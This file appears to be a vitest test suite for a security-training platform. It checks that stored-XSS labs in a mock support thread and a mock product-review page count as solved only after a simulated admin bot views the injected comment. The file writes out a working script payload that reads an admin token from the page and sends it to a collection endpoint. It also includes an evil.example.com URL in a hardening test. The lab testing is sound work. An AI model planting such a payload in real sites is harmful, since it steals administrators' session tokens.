import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { startTestApp, CookieClient, type TestApp } from "./helpers.js";

describe("lab: xss-stored-ticket (SupportDesk community thread)", () => {
  let testApp: TestApp;
  beforeAll(async () => {
    testApp = await startTestApp({ apiPort: 4108, labPortStart: 6300, labPortEnd: 6324 });
  });
  afterAll(async () => {
    await testApp.manager.stopAll();
    await testApp.close();
  });

  it("a harmless comment never solves it", async () => {
    const client = new CookieClient(testApp.baseUrl);
    await client.fetch("/api/auth/guest", { method: "POST" });
    const launch = await client.json<{ instance: { id: string; baseUrl: string } }>("/api/labs/xss-stored-ticket/instances", {
      method: "POST",
    });
    const target = launch.body.instance.baseUrl;

    await fetch(`${target}/thread/comments`, {
      method: "POST",
      headers: { "content-type": "application/x-www-form-urlencoded" },
      body: "name=visitor&message=" + encodeURIComponent("Thanks for the fast response!"),
    });
    const page = await fetch(`${target}/thread`);
    expect(await page.text()).toContain("Thanks for the fast response!");

    const dto = await client.json<{ instance: { solved: boolean } }>(`/api/instances/${launch.body.instance.id}`);
    expect(dto.body.instance.solved).toBe(false);
    await client.fetch(`/api/instances/${launch.body.instance.id}/stop`, { method: "POST" });
  });

  it("a stored payload runs when the admin bot later views the thread", async () => {
    const client = new CookieClient(testApp.baseUrl);
    await client.fetch("/api/auth/guest", { method: "POST" });
    const launch = await client.json<{ instance: { id: string; baseUrl: string } }>("/api/labs/xss-stored-ticket/instances", {
      method: "POST",
    });
    const instanceId = launch.body.instance.id;
    const target = launch.body.instance.baseUrl;

    // Attacker posts the payload as an ordinary (non-admin) visitor.
    const payload = `<script>fetch('/collect?token=' + document.getElementById('admin-token').dataset.token)</script>`;
    const postRes = await fetch(`${target}/thread/comments`, {
      method: "POST",
      headers: { "content-type": "application/x-www-form-urlencoded" },
      body: "name=" + encodeURIComponent("attacker") + "&message=" + encodeURIComponent(payload),
    });
    expect(postRes.status).toBe(200); // plain fetch() auto-follows the handler's 302 redirect to /thread

    // Posting it yourself doesn't solve anything yet — nobody privileged has viewed it.
    let dto = await client.json<{ instance: { solved: boolean } }>(`/api/instances/${instanceId}`);
    expect(dto.body.instance.solved).toBe(false);

    // The admin later reviews the thread.
    const simulate = await client.json<{ ok: boolean }>(`/api/instances/${instanceId}/simulate-admin-visit`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ path: "/thread" }),
    });
    expect(simulate.body.ok).toBe(true);

    dto = await client.json<{ instance: { solved: boolean } }>(`/api/instances/${instanceId}`);
    expect(dto.body.instance.solved).toBe(true);
    const progress = await client.json<{ xp: number }>("/api/progress");
    expect(progress.body.xp).toBe(125); // medium difficulty

    await client.fetch(`/api/instances/${instanceId}/stop`, { method: "POST" });
  }, 30_000);
});

describe("lab: xss-stored-review (ShopMart product reviews)", () => {
  let testApp: TestApp;
  beforeAll(async () => {
    testApp = await startTestApp({ apiPort: 4109, labPortStart: 6325, labPortEnd: 6349 });
  });
  afterAll(async () => {
    await testApp.manager.stopAll();
    await testApp.close();
  });

  it("a stored review payload runs when the admin bot moderates the product page", async () => {
    const client = new CookieClient(testApp.baseUrl);
    await client.fetch("/api/auth/guest", { method: "POST" });
    const launch = await client.json<{ instance: { id: string; baseUrl: string } }>("/api/labs/xss-stored-review/instances", {
      method: "POST",
    });
    const instanceId = launch.body.instance.id;
    const target = launch.body.instance.baseUrl;

    const payload = `<script>fetch('/collect?token=' + document.getElementById('admin-token').dataset.token)</script>`;
    await fetch(`${target}/products/1/reviews`, {
      method: "POST",
      headers: { "content-type": "application/x-www-form-urlencoded" },
      body: "reviewer=" + encodeURIComponent("shopper99") + "&comment=" + encodeURIComponent(payload),
    });

    const simulate = await client.json<{ ok: boolean }>(`/api/instances/${instanceId}/simulate-admin-visit`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ path: "/products/1" }),
    });
    expect(simulate.body.ok).toBe(true);

    const dto = await client.json<{ instance: { solved: boolean } }>(`/api/instances/${instanceId}`);
    expect(dto.body.instance.solved).toBe(true);

    await client.fetch(`/api/instances/${instanceId}/stop`, { method: "POST" });
  }, 30_000);

  it("rejects a simulate-admin-visit path that isn't a relative path (basic hardening)", async () => {
    const client = new CookieClient(testApp.baseUrl);
    await client.fetch("/api/auth/guest", { method: "POST" });
    const launch = await client.json<{ instance: { id: string } }>("/api/labs/xss-stored-review/instances", { method: "POST" });
    const res = await client.fetch(`/api/instances/${launch.body.instance.id}/simulate-admin-visit`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ path: "https://evil.example.com/" }),
    });
    expect(res.status).toBe(400);
    await client.fetch(`/api/instances/${launch.body.instance.id}/stop`, { method: "POST" });
  });
});
